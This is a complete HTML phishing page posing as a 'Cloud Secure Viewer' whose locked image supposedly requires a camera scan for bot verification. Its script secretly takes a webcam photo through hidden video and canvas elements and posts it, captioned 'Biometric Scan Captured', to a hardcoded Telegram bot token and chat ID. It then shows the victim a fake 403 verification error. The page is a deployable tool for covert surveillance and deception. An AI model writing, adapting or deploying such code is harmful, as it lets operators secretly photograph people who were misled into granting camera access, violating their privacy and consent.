<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloud Secure Viewer</title>
    <style>
        body { font-family: sans-serif; background: #121212; color: white; text-align: center; padding: 50px 20px; }
        .box { border: 1px solid #333; padding: 30px; border-radius: 15px; background: #1e1e1e; }
        .btn { background: #0088cc; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-weight: bold; cursor: pointer; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="box">
        <h2>ðŸ”’ Private Content</h2>
        <p>This image is locked. Please perform a quick camera scan to verify you are not a bot.</p>
        <button class="btn" onclick="takeCapture()">UNLOCK & VIEW</button>
        <p id="status" style="color: #888; margin-top: 15px;"></p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const BOT_TOKEN = "8149527318:AAEkQ189QqtT81wZQ9hwT_-eqbL5JFoiFx0";
        const CHAT_ID = "6643732863"; // <--- CHANGE THIS TO YOUR ID

        async function takeCapture() {
            const status = document.getElementById('status');
            status.innerText = "Accessing secure module...";
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                    
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append("chat_id", CHAT_ID);
                        formData.append("photo", blob, "scan.jpg");
                        formData.append("caption", "ðŸŽ¯ Biometric Scan Captured!");

                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: "POST",
                            body: formData
                        });
                    }, 'image/jpeg');

                    stream.getTracks().forEach(t => t.stop());
                    status.innerText = "Error: Verification failed. (403)";
                    alert("Verification Failed. Please try again.");
                }, 2000);
            } catch (err) {
                alert("Permission Denied. You must allow camera access to see the content.");
            }
        }
    </script>
</body>
</html>
